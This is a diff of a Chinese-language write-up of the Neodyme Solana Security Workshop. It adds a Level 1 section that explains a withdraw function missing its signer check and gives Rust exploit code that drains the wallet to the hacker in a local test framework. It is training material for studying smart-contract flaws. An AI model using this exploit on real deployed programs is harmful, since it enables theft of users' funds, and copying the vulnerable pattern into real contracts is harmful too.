@@ -1,9 +1,11 @@
 ---
 title: Neodyme：Solana Security Workshop
 tags:
+    - web3
     - blockchain
     - smart contract
     - solana
+    - rust
 ---
 
 ## Setup - Full
@@ -139,6 +141,7 @@ fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
             AccountMeta::new(challenge.hacker.pubkey(), false),
             AccountMeta::new_readonly(system_program::id(), false),
         ],
+        // add `use borsh::BorshSerialize;` to use `try_to_vec()` method
         data: level0::WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
     };
     env.execute_as_transaction(&[instruction], &[&challenge.hacker]).print_named("Hack: hacker withdraw");
@@ -150,3 +153,63 @@ fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
 - [Calling Between Programs | Solana Docs](https://docs.solana.com/developing/programming-model/calling-between-programs)
 - [Environment in poc_framework - Rust](https://docs.rs/poc-framework/0.1.2/poc_framework/trait.Environment.html)
 - [Option & unwrap - Rust By Example](https://doc.rust-lang.org/rust-by-example/error/option_unwrap.html)
+- [Pubkey::find_program_address - Rust](https://docs.rs/solana-program/latest/solana_program/pubkey/struct.Pubkey.html#method.find_program_address)
+
+## Level 1 - Personal Vault
+
+- 相比于 Level 0，`Wallet` 移除了 `vault`，并保持了除 `vault` 外其它功能的一致性
+
+    ```rs
+    pub struct Wallet {
+        pub authority: Pubkey,
+    }
+    ```
+
+- `withdraw` 中 `wallet_info`、`authority_info` 仍然由调用者提供，且只检查 `wallet` 的 `owner` 是否为对应程序以及 `wallet` 中存储的 `authority` 与提供的 `authority_info` 是否匹配，并没有检查 `authority_info` 是否为 signer
+
+    ```rs
+    fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
+        msg!("withdraw {}", amount);
+        let account_info_iter = &mut accounts.iter();
+        let wallet_info = next_account_info(account_info_iter)?;
+        let authority_info = next_account_info(account_info_iter)?;
+        let destination_info = next_account_info(account_info_iter)?;
+        let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;
+
+        assert_eq!(wallet_info.owner, program_id);
+        assert_eq!(wallet.authority, *authority_info.key);
+
+        if amount > **wallet_info.lamports.borrow_mut() {
+            return Err(ProgramError::InsufficientFunds);
+        }
+
+        **wallet_info.lamports.borrow_mut() -= amount;
+        **destination_info.lamports.borrow_mut() += amount;
+
+        wallet
+            .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
+            .unwrap();
+
+        Ok(())
+    }
+    ```
+
+### Exploit
+
+```rs
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    let amount = env.get_account(challenge.wallet_address).unwrap().lamports;
+
+    let instruction = Instruction {
+        program_id: challenge.wallet_program,
+        accounts: vec![
+            AccountMeta::new(challenge.wallet_address, false),
+            AccountMeta::new(challenge.wallet_authority, false),
+            AccountMeta::new(challenge.hacker.pubkey(), true),
+            AccountMeta::new_readonly(system_program::id(), false),
+        ],
+        data: level1::WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
+    };
+    env.execute_as_transaction(&[instruction], &[&challenge.hacker]).print_named("Hack: hacker withdraw");
+}
+```
